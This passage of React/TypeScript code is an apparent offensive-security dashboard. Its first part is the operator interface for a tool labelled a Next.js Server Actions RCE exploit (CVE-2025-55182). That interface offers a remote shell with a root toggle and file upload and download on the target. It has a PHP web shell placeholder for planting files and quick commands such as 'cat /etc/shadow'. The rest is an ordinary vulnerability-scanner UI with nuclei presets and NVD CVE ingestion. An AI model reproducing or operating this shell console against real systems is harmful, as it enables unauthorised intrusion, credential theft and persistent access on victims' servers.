          <div className="card p-4 space-y-3">
            <p className="text-xs font-mono text-accent-primary font-bold flex items-center gap-1.5">
              <span className="w-4 h-4 rounded-full bg-accent-primary bg-opacity-20 text-accent-primary flex items-center justify-center text-xs">4</span>
              Shell Access
            </p>
            <div>
              <label className="label-field">Target URL</label>
              <input value={targetUrl} onChange={e => setTargetUrl(e.target.value)}
                className="input-field font-mono text-sm" placeholder="https://vuln.target.com/api" />
            </div>

            {!connected ? (
              <button onClick={connectShell} disabled={execLoading || !targetUrl}
                className="btn-primary w-full flex items-center justify-center gap-2">
                {execLoading ? <><Loader size={13} className="animate-spin" />Connecting...</> : <><Wifi size={13} />Connect & Verify</>}
              </button>
            ) : (
              <>
                {/* Connection status */}
                <div className="p-3 rounded-lg border border-severity-low border-opacity-30 bg-severity-low bg-opacity-5 space-y-1">
                  <div className="flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full bg-severity-low animate-pulse" />
                    <span className="text-xs font-mono text-severity-low font-bold">SHELL ACTIVE</span>
                    <span className={`ml-auto text-xs font-mono ${rootMode ? 'text-red-400 font-bold' : 'text-text-muted'}`}>
                      {rootMode ? '⚡ ROOT' : 'user'}
                    </span>
                  </div>
                  {currentDir && <p className="text-xs font-mono text-accent-primary">📂 {currentDir}</p>}
                  <p className="text-xs font-mono text-text-muted truncate">{shellEndpoint}</p>
                </div>

                {/* Controls */}
                <div className="grid grid-cols-2 gap-1.5">
                  <button onClick={() => execCmd('.root')}
                    className={`text-xs font-mono py-2 rounded border transition-all ${rootMode ? 'border-red-500 text-red-400 bg-red-900 bg-opacity-20' : 'border-border-default text-text-muted hover:border-red-500 hover:text-red-400'}`}>
                    ⚡ root
                  </button>
                  <button onClick={() => { setConnected(false); setCurrentDir(null); setShellLines(l => [...l, { type: 'info', text: '[*] Disconnected' }]) }}
                    className="text-xs font-mono py-2 rounded border border-border-default text-text-muted hover:border-severity-critical hover:text-severity-critical transition-all">
                    <WifiOff size={11} className="inline mr-1" />disconnect
                  </button>
                  <button onClick={() => setFileModal('upload')}
                    className="text-xs font-mono py-2 rounded border border-border-default text-text-muted hover:border-accent-primary hover:text-accent-primary transition-all">
                    <Upload size={11} className="inline mr-1" />upload
                  </button>
                  <button onClick={() => setFileModal('download')}
                    className="text-xs font-mono py-2 rounded border border-border-default text-text-muted hover:border-accent-primary hover:text-accent-primary transition-all">
                    <Download size={11} className="inline mr-1" />download
                  </button>
                  <button onClick={() => setFileModal('create')}
                    className="col-span-2 text-xs font-mono py-2 rounded border border-border-default text-text-muted hover:border-accent-primary hover:text-accent-primary transition-all">
                    <FilePlus size={11} className="inline mr-1" />create file on target
                  </button>
                </div>

                {/* Quick cmds */}
                <div>
                  <p className="text-xs font-mono text-text-muted mb-1.5">Quick:</p>
                  <div className="grid grid-cols-2 gap-1">
                    {['id','whoami','uname -a','cat /etc/passwd','ps aux','env','ls /','ifconfig','hostname','cat /etc/shadow'].map(cmd => (
                      <button key={cmd} onClick={() => { setShellCmd(cmd); shellInputRef.current?.focus() }}
                        className="text-xs font-mono px-2 py-1.5 text-left rounded border border-border-default text-text-muted hover:border-accent-primary hover:text-accent-primary transition-all truncate">
                        {cmd}
                      </button>
                    ))}
                  </div>
                </div>
              </>
            )}
          </div>
        )}
      </div>

      {/* ── Terminal panel ───────────────────────────────────── */}
      <div className="flex-1 flex flex-col min-h-0 rounded-xl overflow-hidden border border-gray-800" style={{ background: '#060a0f' }}>
        {/* Mac-style titlebar */}
        <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-800 flex-shrink-0" style={{ background: '#0d1117' }}>
          <div className="flex items-center gap-3">
            <div className="flex gap-1.5">
              <div className="w-3 h-3 rounded-full bg-red-500 opacity-70 hover:opacity-100 cursor-pointer" />
              <div className="w-3 h-3 rounded-full bg-yellow-500 opacity-70 hover:opacity-100 cursor-pointer" />
              <div className="w-3 h-3 rounded-full bg-green-500 opacity-70 hover:opacity-100 cursor-pointer" />
            </div>
            <span className="text-xs font-mono text-gray-500">
              {tab === 'shell' && connected
                ? `${rootMode ? 'root' : 'user'}@target:${currentDir || '~'} — CVE-2025-55182`
                : 'react2shell — subdomain/vuln scanner'
              }
            </span>
          </div>
          <div className="flex items-center gap-3">
            {(execLoading || scanning) && <Loader size={11} className="text-cyan-400 animate-spin" />}
            <button onClick={() => copyLines(tab === 'shell' ? shellLines : scanLines)}
              className="text-xs font-mono text-gray-600 hover:text-gray-300 flex items-center gap-1">
              <Copy size={11} /> copy
            </button>
            <button onClick={() => tab === 'shell' ? setShellLines([]) : setScanLines([])}
              className="text-xs font-mono text-gray-600 hover:text-gray-300">clear</button>
          </div>
        </div>

        {/* Output */}
        {tab === 'scanner'
          ? <Terminal_ lines={scanLines} loading={scanning} />
          : <>
              {shellLines.length === 0 && !connected && !execLoading
                ? (
                  <div className="flex-1 flex items-center justify-center">
                    <div className="text-center">
                      <pre className="font-mono text-xs leading-4 mb-3 select-none" style={{ color: '#1a3d1a' }}>{`
 ██████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝
██████╔╝██║     █████╗
██╔══██╗██║     ██╔══╝
██║  ██║╚██████╗███████╗
╚═╝  ╚═╝ ╚═════╝╚══════╝`}</pre>
                      <p className="font-mono text-xs" style={{ color: '#1a3a1a' }}>CVE-2025-55182</p>
                      <p className="font-mono text-xs mt-1" style={{ color: '#152a15' }}>Next.js Server Actions RCE</p>
                      <p className="font-mono text-xs mt-0.5" style={{ color: '#0f1f0f' }}>by Master Ramdan</p>
                    </div>
                  </div>
                )
                : <Terminal_ lines={shellLines} loading={execLoading} />
              }

              {/* Shell input */}
              {connected && (
                <div className="flex items-center gap-2 px-4 py-3 border-t border-gray-800 flex-shrink-0" style={{ background: '#0d1117' }}>
                  <span className="font-mono text-xs flex-shrink-0 select-none">
                    <span className={rootMode ? 'text-red-400 font-bold' : 'text-green-400 font-bold'}>{rootMode ? 'root' : 'user'}</span>
                    <span className="text-gray-600">@</span>
                    <span className="text-cyan-700">target</span>
                    <span className="text-gray-600">:</span>
                    <span className="text-blue-600">{currentDir || '~'}</span>
                    <span className="text-gray-500">$ </span>
                  </span>
                  <input
                    ref={shellInputRef}
                    value={shellCmd}
                    onChange={e => setShellCmd(e.target.value)}
                    onKeyDown={handleShellKey}
                    className="flex-1 bg-transparent font-mono text-xs text-green-300 outline-none caret-green-400"
                    placeholder=".help untuk daftar command..."
                    autoFocus
                    spellCheck={false}
                    autoComplete="off"
                  />
                </div>
              )}
            </>
        }
      </div>

      {/* ── File Modals ──────────────────────────────────────── */}
      {fileModal && (
        <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50">
          <div className="card w-[480px] p-6 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="font-mono font-bold text-sm text-text-primary flex items-center gap-2">
                {fileModal === 'upload' && <><Upload size={14} className="text-accent-primary" /> Upload File</>}
                {fileModal === 'download' && <><Download size={14} className="text-accent-primary" /> Download File</>}
                {fileModal === 'create' && <><FilePlus size={14} className="text-accent-primary" /> Create File on Target</>}
              </h3>
              <button onClick={() => setFileModal(null)} className="text-text-muted hover:text-text-primary"><X size={14} /></button>
            </div>

            {fileModal === 'upload' && (
              <>
                <p className="text-xs text-text-muted font-mono">File akan diupload ke <code>/tmp/&lt;filename&gt;</code> via base64 chunked transfer</p>
                <input ref={fileInputRef} type="file"
                  onChange={e => e.target.files?.[0] && handleFileUpload(e.target.files[0])}
                  className="hidden" />
                <button onClick={() => fileInputRef.current?.click()} disabled={fileOpLoading}
                  className="btn-primary w-full flex items-center justify-center gap-2">
                  {fileOpLoading ? <><Loader size={13} className="animate-spin" />Uploading...</> : <><FolderOpen size={13} />Choose File</>}
                </button>
              </>
            )}

            {fileModal === 'download' && (
              <>
                <div>
                  <label className="label-field">Remote File Path</label>
                  <input value={fileDownloadPath} onChange={e => setFileDownloadPath(e.target.value)}
                    className="input-field font-mono text-sm" placeholder="/etc/passwd" />
                </div>
                <button onClick={handleFileDownload} disabled={fileOpLoading || !fileDownloadPath}
                  className="btn-primary w-full flex items-center justify-center gap-2">
                  {fileOpLoading ? <><Loader size={13} className="animate-spin" />Downloading...</> : <><Download size={13} />Download</>}
                </button>
              </>
            )}

            {fileModal === 'create' && (
              <>
                <div>
                  <label className="label-field">Remote File Path</label>
                  <input value={fileCreatePath} onChange={e => setFileCreatePath(e.target.value)}
                    className="input-field font-mono text-sm" placeholder="/tmp/shell.php" />
                </div>
                <div>
                  <label className="label-field">File Content</label>
                  <textarea value={fileCreateContent} onChange={e => setFileCreateContent(e.target.value)}
                    className="input-field h-40 resize-none font-mono text-xs"
                    placeholder={"<?php system($_GET['cmd']); ?>"} />
                </div>
                <button onClick={handleFileCreate} disabled={fileOpLoading || !fileCreatePath || !fileCreateContent}
                  className="btn-primary w-full flex items-center justify-center gap-2">
                  {fileOpLoading ? <><Loader size={13} className="animate-spin" />Creating...</> : <><FilePlus size={13} />Create File</>}
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  )
}

// ── Tool card ─────────────────────────────────────────────────
function ToolCard({ tool, selected, onClick }: { tool: any, selected: boolean, onClick: () => void }) {
  return (
    <button onClick={onClick}
      className={`w-full text-left p-4 rounded-xl border transition-all ${
        selected ? 'bg-accent-primary bg-opacity-10 border-accent-primary' : 'bg-bg-secondary border-border-default hover:border-border-muted hover:bg-bg-hover'
      }`}>
      <div className="flex items-start gap-3">
        <div className="p-2 rounded-lg border border-red-900 text-red-400 bg-red-950 bg-opacity-40">
          <Skull size={16} />
        </div>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <p className="font-mono font-bold text-sm text-text-primary">{tool.name}</p>
            {tool.cve && (
              <span className="text-xs font-mono text-red-400 bg-red-900 bg-opacity-30 border border-red-900 border-opacity-50 px-1.5 py-0.5 rounded">
                {tool.cve}
              </span>
            )}
          </div>
          <p className="text-xs text-text-muted mt-1 leading-relaxed">{tool.desc}</p>
          <div className="flex flex-wrap gap-1 mt-2">
            {tool.tags.map((t: string) => (
              <span key={t} className="text-xs font-mono text-text-muted border border-border-default px-1.5 py-0.5 rounded">{t}</span>
            ))}
          </div>
          <p className="text-xs font-mono text-text-muted mt-1.5 opacity-60">by {tool.author}</p>
        </div>
      </div>
    </button>
  )
}

// ── Main page ─────────────────────────────────────────────────
class ErrorBoundary extends React.Component<{children: React.ReactNode}, {hasError: boolean, error: string}> {
  constructor(props: any) {
    super(props)
    this.state = { hasError: false, error: '' }
  }
  static getDerivedStateFromError(error: any) {
    return { hasError: true, error: error?.message || String(error) }
  }
  render() {
    if (this.state.hasError) {
      return (
        <div className="flex flex-col items-center justify-center h-full gap-4 p-8">
          <AlertTriangle size={40} className="text-severity-critical" />
          <p className="text-severity-critical font-mono text-sm font-bold">Module crashed</p>
          <p className="text-text-muted font-mono text-xs text-center max-w-md">{this.state.error}</p>
          <button
            onClick={() => this.setState({ hasError: false, error: '' })}
            className="btn-primary text-sm">
            Reload Module
          </button>
        </div>
      )
    }
    return this.props.children
  }
}

// ── Types ─────────────────────────────────────────────────────
interface Module {
  id: string
  label: string
  icon: string
  desc: string
  timeout: number
}

interface Finding {
  id: string
  module: string
  severity: string
  title: string
  description: string
  evidence: string
  host: string
  port: number | null
  protocol: string
  service: string
  cve_ids: string[]
  cvss_score: number | null
  remediation: string
  owasp_category: string
  false_positive: boolean
  created_at: string
}

interface ScanJob {
  job_id: string
  target: string
  status: string
  progress: number
  modules: string[]
  finding_count: number
  result_summary: any
  created_at: string
  finished_at: string | null
}

// ── Constants ─────────────────────────────────────────────────
const SEV_META: Record<string, { color: string, bg: string, border: string, label: string, order: number }> = {
  critical: { color: '#ff5f5f', bg: '#ff5f5f15', border: '#ff5f5f40', label: 'Critical', order: 0 },
  high:     { color: '#ff9f43', bg: '#ff9f4315', border: '#ff9f4340', label: 'High',     order: 1 },
  medium:   { color: '#ffd43b', bg: '#ffd43b15', border: '#ffd43b40', label: 'Medium',   order: 2 },
  low:      { color: '#a9e34b', bg: '#a9e34b15', border: '#a9e34b40', label: 'Low',      order: 3 },
  info:     { color: '#74c7ec', bg: '#74c7ec15', border: '#74c7ec40', label: 'Info',     order: 4 },
}

const MODULE_ICONS: Record<string, any> = {
  port_scan: Cpu, web_scan: Globe, ssl_tls: Shield,
  headers: Lock, subdomain: Search, dns: Server,
  cve_match: AlertTriangle,
}

const PRESET_SCANS = [
  { label: 'Quick',    modules: ['headers', 'ssl_tls', 'dns'],                          color: '#a9e34b', desc: '~2 min' },
  { label: 'Web',      modules: ['headers', 'ssl_tls', 'web_scan'],                     color: '#6366f1', desc: '~8 min' },
  { label: 'Full',     modules: ['port_scan', 'web_scan', 'ssl_tls', 'headers', 'dns', 'cve_match'], color: '#ff9f43', desc: '~15 min' },
  { label: 'Recon',    modules: ['subdomain', 'dns', 'headers'],                        color: '#06b6d4', desc: '~5 min' },
]

// ── Finding Card ──────────────────────────────────────────────
function FindingCard({ finding, onToggleFP }: { finding: Finding, onToggleFP: (id: string) => void }) {
  const [expanded, setExpanded] = useState(false)
  const sev = SEV_META[finding.severity] || SEV_META.info
  const ModIcon = MODULE_ICONS[finding.module] || Shield

  return (
    <div className={`rounded-lg border transition-all ${finding.false_positive ? 'opacity-40' : ''}`}
      style={{ borderColor: sev.border, backgroundColor: sev.bg }}>
      <button className="w-full text-left p-3 flex items-start gap-3"
        onClick={() => setExpanded(!expanded)}>
        <div className="flex-shrink-0 mt-0.5">
          <div className="w-2 h-2 rounded-full mt-1.5" style={{ backgroundColor: sev.color }} />
        </div>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-xs font-mono font-bold" style={{ color: sev.color }}>
              {sev.label.toUpperCase()}
            </span>
            {finding.cvss_score && (
              <span className="text-xs font-mono text-text-muted border border-border-default px-1.5 rounded">
                CVSS {finding.cvss_score.toFixed(1)}
              </span>
            )}
            {finding.cve_ids.length > 0 && (
              <span className="text-xs font-mono text-severity-critical border border-severity-critical border-opacity-40 px-1.5 rounded">
                {finding.cve_ids[0]}
              </span>
            )}
            {finding.false_positive && (
              <span className="text-xs font-mono text-text-muted border border-border-default px-1.5 rounded">FP</span>
            )}
          </div>
          <p className="text-sm font-mono text-text-primary mt-0.5 truncate">{finding.title}</p>
          <div className="flex items-center gap-3 mt-1">
            <span className="text-xs font-mono text-text-muted flex items-center gap-1">
              <ModIcon size={10} /> {finding.module.replace('_',' ')}
            </span>
            {finding.host && <span className="text-xs font-mono text-text-muted">{finding.host}{finding.port ? `:${finding.port}` : ''}</span>}
            {finding.owasp_category && (
              <span className="text-xs font-mono text-accent-primary">{finding.owasp_category}</span>
            )}
          </div>
        </div>
        <ChevronDown size={14} className={`text-text-muted flex-shrink-0 mt-1 transition-transform ${expanded ? 'rotate-180' : ''}`} />
      </button>

      {expanded && (
        <div className="px-3 pb-3 space-y-2 border-t border-border-default border-opacity-30 pt-3">
          {finding.description && (
            <div>
              <p className="text-xs font-mono text-text-muted mb-1">Description</p>
              <p className="text-xs text-text-secondary">{finding.description}</p>
            </div>
          )}
          {finding.evidence && (
            <div>
              <p className="text-xs font-mono text-text-muted mb-1">Evidence</p>
              <pre className="text-xs font-mono text-text-secondary bg-bg-tertiary p-2 rounded overflow-x-auto whitespace-pre-wrap break-all">{finding.evidence}</pre>
            </div>
          )}
          {finding.remediation && (
            <div>
              <p className="text-xs font-mono text-text-muted mb-1">Remediation</p>
              <p className="text-xs text-severity-low">{finding.remediation}</p>
            </div>
          )}
          <div className="flex justify-end">
            <button onClick={() => onToggleFP(finding.id)}
              className="text-xs font-mono text-text-muted hover:text-text-secondary border border-border-default px-2 py-1 rounded transition-colors">
              {finding.false_positive ? <><Eye size={10} className="inline mr-1" />Mark Real</> : <><EyeOff size={10} className="inline mr-1" />False Positive</>}
            </button>
          </div>
        </div>
      )}
    </div>
  )
}

// ── Severity Bar ──────────────────────────────────────────────
function SeverityBar({ summary }: { summary: any }) {
  if (!summary) return null
  const total = summary.total || 1
  const bars = [
    { key: 'critical', ...SEV_META.critical },
    { key: 'high',     ...SEV_META.high },
    { key: 'medium',   ...SEV_META.medium },
    { key: 'low',      ...SEV_META.low },
    { key: 'info',     ...SEV_META.info },
  ]
  return (
    <div className="space-y-2">
      <div className="flex h-3 rounded-full overflow-hidden gap-px">
        {bars.map(b => {
          const count = summary[b.key] || 0
          const pct = (count / total) * 100
          if (pct === 0) return null
          return (
            <div key={b.key} style={{ width: `${pct}%`, backgroundColor: b.color }}
              title={`${b.label}: ${count}`} />
          )
        })}
      </div>
      <div className="flex gap-3 flex-wrap">
        {bars.map(b => {
          const count = summary[b.key] || 0
          if (count === 0) return null
          return (
            <div key={b.key} className="flex items-center gap-1">
              <div className="w-2 h-2 rounded-full" style={{ backgroundColor: b.color }} />
              <span className="text-xs font-mono text-text-muted">{count} {b.label}</span>
            </div>
          )
        })}
        {summary.risk_score !== undefined && (
          <span className="ml-auto text-xs font-mono font-bold"
            style={{ color: summary.risk_score >= 70 ? '#ff5f5f' : summary.risk_score >= 40 ? '#ff9f43' : '#a9e34b' }}>
            Risk: {summary.risk_score}
          </span>
        )}
      </div>
    </div>
  )
}

// ── Scan History Item ─────────────────────────────────────────
function HistoryItem({ job, onSelect }: { job: ScanJob, onSelect: () => void }) {
  const statusColor = {
    completed: 'text-severity-low', failed: 'text-severity-critical',
    running: 'text-accent-primary', queued: 'text-text-muted',
  }[job.status] || 'text-text-muted'

  return (
    <button onClick={onSelect}
      className="w-full text-left p-3 rounded-lg border border-border-default hover:border-border-muted transition-all">
      <div className="flex items-center justify-between mb-1">
        <p className="font-mono text-sm text-text-primary truncate flex-1">{job.target}</p>
        <span className={`text-xs font-mono ml-2 ${statusColor}`}>{job.status}</span>
      </div>
      <div className="flex items-center gap-3">
        <span className="text-xs font-mono text-text-muted">{job.modules.length} modules</span>
        <span className="text-xs font-mono text-text-muted">{job.finding_count} findings</span>
        {job.result_summary?.risk_score !== undefined && (
          <span className="text-xs font-mono text-text-muted">risk: {job.result_summary.risk_score}</span>
        )}
        <span className="text-xs font-mono text-text-muted ml-auto">
          {job.created_at ? new Date(job.created_at).toLocaleDateString() : ''}
        </span>
      </div>
      {job.status === 'running' && (
        <div className="mt-2 h-1 bg-bg-tertiary rounded-full overflow-hidden">
          <div className="h-full bg-accent-primary rounded-full transition-all" style={{ width: `${job.progress}%` }} />
        </div>
      )}
    </button>
  )
}

// ── NVD Stats Panel ───────────────────────────────────────────
function NVDPanel() {
  const [ingesting, setIngesting] = useState(false)
  const [years, setYears] = useState('2023,2024,2025')
  const queryClient = useQueryClient()

  const { data: stats } = useQuery({
    queryKey: ['nvd-stats'],
    queryFn: () => api.get('/scan-engine/nvd/stats').then(r => r.data),
    refetchInterval: ingesting ? 5000 : 60000,
  })

  const handleIngest = async () => {
    const yearList = years.split(',').map(y => parseInt(y.trim())).filter(y => !isNaN(y))
    if (yearList.length === 0) { toast.error('Invalid years'); return }
    setIngesting(true)
    try {
      await api.post('/scan-engine/nvd/ingest', { years: yearList })
      toast.success(`NVD ingestion queued for: ${yearList.join(', ')}`)
      setTimeout(() => {
        queryClient.invalidateQueries({ queryKey: ['nvd-stats'] })
        setIngesting(false)
      }, 5000)
    } catch (e: any) {
      toast.error(e.response?.data?.detail || 'Failed')
      setIngesting(false)
    }
  }

  return (
    <div className="card p-4 space-y-4">
      <div className="flex items-center justify-between">
        <h3 className="text-sm font-mono font-bold text-text-primary flex items-center gap-2">
          <Database size={14} className="text-accent-primary" /> NVD CVE Database
        </h3>
      </div>

      {stats && (
        <div className="grid grid-cols-3 gap-2">
          {[
            { label: 'Total CVEs', value: (stats.total_cves || 0).toLocaleString(), color: '#6366f1' },
            { label: 'KEV', value: (stats.kev_count || 0).toLocaleString(), color: '#ef4444' },
            { label: 'Critical', value: (stats.critical_count || 0).toLocaleString(), color: '#ff5f5f' },
          ].map(({ label, value, color }) => (
            <div key={label} className="bg-bg-tertiary rounded-lg p-2.5 border border-border-default text-center">
              <p className="text-sm font-display font-bold" style={{ color }}>{value}</p>
              <p className="text-xs font-mono text-text-muted">{label}</p>
            </div>
          ))}
        </div>
      )}

      {stats?.total_cves === 0 && (
        <p className="text-xs font-mono text-severity-medium text-center py-2">
          ⚠ CVE database empty — ingest NVD feeds first
        </p>
      )}

      <div className="space-y-2">
        <label className="text-xs font-mono text-text-muted">Years to ingest</label>
        <input value={years} onChange={e => setYears(e.target.value)}
          className="input-field font-mono text-sm" placeholder="2023,2024,2025" />
        <button onClick={handleIngest} disabled={ingesting}
          className="w-full flex items-center justify-center gap-2 py-2 text-xs font-mono rounded-lg border border-accent-primary text-accent-primary hover:bg-accent-primary hover:bg-opacity-10 transition-all disabled:opacity-50">
          {ingesting
            ? <><RefreshCw size={11} className="animate-spin" />Ingesting...</>
            : <><Download size={11} />Ingest NVD Feeds</>
          }
        </button>
      </div>

      {stats?.recent_ingestions?.length > 0 && (
        <div className="space-y-1">
          <p className="text-xs font-mono text-text-muted">Recent ingestions</p>
          {stats.recent_ingestions.map((log: any, i: number) => (
            <div key={i} className="flex items-center justify-between text-xs font-mono">
              <span className="text-text-muted">{log.year}</span>
              <span className={log.status === 'done' ? 'text-severity-low' : log.status === 'failed' ? 'text-severity-critical' : 'text-accent-primary'}>
                {log.status === 'done' ? `✓ ${(log.count||0).toLocaleString()} CVEs` : log.status}
              </span>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

// ── Main Scan Engine Module ───────────────────────────────────
function ScanEngineModule() {
  const [target, setTarget] = useState('')
  const [selectedModules, setSelectedModules] = useState<string[]>(['headers', 'ssl_tls', 'dns'])
  const [nucleiPreset, setNucleiPreset] = useState<'quick'|'standard'|'full'>('quick')
  const [nucleiCustomTemplates, setNucleiCustomTemplates] = useState<string[]>([])
  const [showTemplateSearch, setShowTemplateSearch] = useState(false)
  const [templateSearch, setTemplateSearch] = useState('')
  const [scanning, setScanning] = useState(false)
  const [activeJobId, setActiveJobId] = useState<string | null>(null)
  const [progress, setProgress] = useState(0)
  const [scanStatus, setScanStatus] = useState('')
  const [findings, setFindings] = useState<Finding[]>([])
  const [filterSev, setFilterSev] = useState('')
  const [filterModule, setFilterModule] = useState('')
  const [viewMode, setViewMode] = useState<'findings'|'history'|'nvd'>('findings')
  const [summary, setSummary] = useState<any>(null)
  const [scanLog, setScanLog] = useState<string[]>([])
  const [selectedHistoryJob, setSelectedHistoryJob] = useState<string | null>(null)
  const cancelRef = useRef<(() => void) | null>(null)
  const logRef = useRef<HTMLDivElement>(null)
  const queryClient = useQueryClient()

  const { data: modules = [] } = useQuery({
    queryKey: ['scan-engine-modules'],
    queryFn: () => api.get('/scan-engine/modules').then(r => r.data),
    staleTime: 300000,
  })
  const { data: nucleiTemplates = {} } = useQuery({
    queryKey: ['nuclei-templates'],
    queryFn: () => api.get('/scan-engine/nuclei/templates').then(r => r.data),
    staleTime: 600000,
    enabled: selectedModules.includes('web_scan'),
  })

  const { data: history = [] } = useQuery({
    queryKey: ['scan-engine-history'],
    queryFn: () => api.get('/scan-engine/history').then(r => r.data),
    refetchInterval: scanning ? 5000 : 30000,
  })

  // Fetch findings for selected history job
  const { data: historyFindings } = useQuery({
    queryKey: ['scan-findings', selectedHistoryJob],
    queryFn: () => selectedHistoryJob
      ? api.get(`/scan-engine/findings/${selectedHistoryJob}`).then(r => r.data)
      : null,
    enabled: !!selectedHistoryJob,
  })

  const toggleModule = (id: string) => {
    setSelectedModules(prev =>
      prev.includes(id) ? prev.filter(m => m !== id) : [...prev, id]
    )
  }

  const addLog = (msg: string) => {
    setScanLog(prev => [...prev.slice(-200), msg])
    setTimeout(() => logRef.current?.scrollTo(0, logRef.current.scrollHeight), 50)
  }

  const fpMutation = useMutation({
    mutationFn: (id: string) => api.patch(`/scan-engine/findings/${id}/fp`),
    onSuccess: (res, id) => {
      setFindings(prev => prev.map(f =>
        f.id === id ? { ...f, false_positive: res.data.false_positive } : f
      ))
    },
  })

  const startScan = async () => {
    if (!target.trim()) { toast.error('Target required'); return }
    if (selectedModules.length === 0) { toast.error('Select at least one module'); return }

    setScanning(true)
    setFindings([])
    setSummary(null)
    setScanLog([])
    setProgress(0)
    setScanStatus('queued')
    setViewMode('findings')

    addLog(`[*] Starting scan: ${target}`)
    addLog(`[*] Modules: ${selectedModules.join(', ')}`)
    addLog('')

    try {
      const res = await api.post('/scan-engine/run', {
        target: target.trim(),
        modules: selectedModules,
        options: selectedModules.includes('web_scan') ? {
          nuclei_preset: nucleiPreset,
          templates: nucleiCustomTemplates.length > 0
            ? nucleiCustomTemplates.join(',')
            : nucleiPreset === 'quick'
            ? 'technologies,misconfiguration'
            : nucleiPreset === 'standard'
            ? 'technologies,misconfiguration,exposures,vulnerabilities'
            : 'technologies,misconfiguration,exposures,vulnerabilities,cves,default-logins,exposed-panels',
        } : {},
      })
      const jobId = res.data.job_id
      setActiveJobId(jobId)
      addLog(`[*] Job ID: ${jobId}`)
      addLog(`[*] Streaming results...`)
      addLog('')

      // SSE stream
      const token = (() => {
        try {
          return JSON.parse(localStorage.getItem('offensecops-auth') || '{}')?.state?.accessToken || ''
        } catch { return '' }
      })()

      const controller = new AbortController()
      cancelRef.current = () => controller.abort()

      const streamRes = await fetch(`/api/scan-engine/stream/${jobId}`, {
        headers: { Authorization: `Bearer ${token}` },
        signal: controller.signal,
      })

      const reader = streamRes.body?.getReader()
      if (!reader) throw new Error('No stream')
      const decoder = new TextDecoder()
      let buf = ''

      while (true) {
        const { done, value } = await reader.read()
        if (done) break
        buf += decoder.decode(value, { stream: true })
        const lines = buf.split('\n')
        buf = lines.pop() || ''

        for (const line of lines) {
          if (!line.startsWith('data: ')) continue
          try {
            const d = JSON.parse(line.slice(6))

            if (d.type === 'finding') {
              const f = d.finding
              setFindings(prev => [...prev, f])
              const sev = f.severity.toUpperCase()
              const prefix = sev === 'CRITICAL' ? '!!' : sev === 'HIGH' ? '! ' : '+ '
              addLog(`[${prefix}] [${f.module}] ${f.title}${f.host ? ` — ${f.host}${f.port ? ':'+f.port : ''}` : ''}`)
              if (f.cve_ids?.length > 0) addLog(`    CVE: ${f.cve_ids.join(', ')}`)
            } else if (d.type === 'progress') {
              setProgress(d.progress)
              setScanStatus(d.status)
            } else if (d.type === 'done') {
              setProgress(100)
              setScanStatus('completed')
              setSummary(d.summary)
              addLog('')
              addLog(`[=] Scan complete — ${d.finding_count} findings`)
              if (d.summary?.risk_score !== undefined) {
                addLog(`[=] Risk score: ${d.summary.risk_score}`)
              }
              setScanning(false)
              cancelRef.current = null
              queryClient.invalidateQueries({ queryKey: ['scan-engine-history'] })
            } else if (d.type === 'error') {
              addLog(`[-] Error: ${d.message}`)
              setScanning(false)
            }
          } catch {}
        }
      }
    } catch (e: any) {
      if (e.name !== 'AbortError') {
        addLog(`[-] Error: ${e.message}`)
        toast.error('Scan failed')
      } else {
        addLog('[!] Scan cancelled')
      }
      setScanning(false)
      cancelRef.current = null
    }
  }

  const cancelScan = () => {
    if (cancelRef.current) { cancelRef.current(); cancelRef.current = null }
    setScanning(false)
    addLog('[!] Cancelled by user')
  }

  // Display findings — either live scan or history
  const displayFindings = selectedHistoryJob && historyFindings
    ? historyFindings.findings
    : findings

  const filteredFindings = displayFindings.filter((f: Finding) => {
    if (filterSev && f.severity !== filterSev) return false
    if (filterModule && f.module !== filterModule) return false
    if (f.false_positive && filterSev !== 'fp') return false
    return true
  })

  const findingModules = [...new Set(displayFindings.map((f: Finding) => f.module))]

  return (
    <div className="flex gap-4 h-full min-h-0">
      {/* ── Left Panel ───────────────────────────────────────── */}
      <div className="w-72 flex-shrink-0 flex flex-col gap-3 overflow-y-auto">

        {/* Target input */}
        <div className="card p-4 space-y-3">
          <p className="text-xs font-mono font-bold text-accent-primary flex items-center gap-1.5">
            <Target size={12} /> Scan Target
          </p>
          <input
            value={target}
            onChange={e => setTarget(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && !scanning && startScan()}
            className="input-field font-mono text-sm"
            placeholder="example.com / 192.168.1.1"
            disabled={scanning}
          />

          {/* Presets */}
          <div>
            <p className="text-xs font-mono text-text-muted mb-2">Quick Presets</p>
            <div className="grid grid-cols-2 gap-1.5">
              {PRESET_SCANS.map(p => (
                <button key={p.label} onClick={() => setSelectedModules(p.modules)}
                  disabled={scanning}
                  className="text-left p-2 rounded-lg border border-border-default hover:border-border-muted transition-all disabled:opacity-50">
                  <p className="text-xs font-mono font-bold text-text-primary">{p.label}</p>
                  <p className="text-xs font-mono text-text-muted">{p.desc}</p>
                </button>
              ))}
            </div>
          </div>

          {/* Module selector */}
          <div>
            <p className="text-xs font-mono text-text-muted mb-2">Modules ({selectedModules.length} selected)</p>
            <div className="space-y-1">
              {(modules as Module[]).map(m => {
                const Icon = MODULE_ICONS[m.id] || Shield
                const selected = selectedModules.includes(m.id)
                return (
                  <button key={m.id} onClick={() => !scanning && toggleModule(m.id)}
                    disabled={scanning}
                    className={`w-full flex items-center gap-2.5 p-2 rounded-lg border transition-all text-left disabled:opacity-50 ${
                      selected
                        ? 'border-accent-primary bg-accent-primary bg-opacity-10 text-accent-primary'
                        : 'border-border-default text-text-muted hover:border-border-muted'
                    }`}>
                    <Icon size={12} className="flex-shrink-0" />
                    <div className="min-w-0 flex-1">
                      <p className="text-xs font-mono font-bold truncate">{m.label}</p>
                      <p className="text-xs font-mono opacity-60 truncate">{m.desc}</p>
                    </div>
                    {selected && <CheckCircle size={11} className="flex-shrink-0" />}
                  </button>
                )
              })}
            </div>
          </div>

          {/* Nuclei template selector — shown when web_scan selected */}
          {selectedModules.includes('web_scan') && (
            <div className="card p-3 space-y-2 border-accent-primary border-opacity-40">
              <div className="flex items-center justify-between">
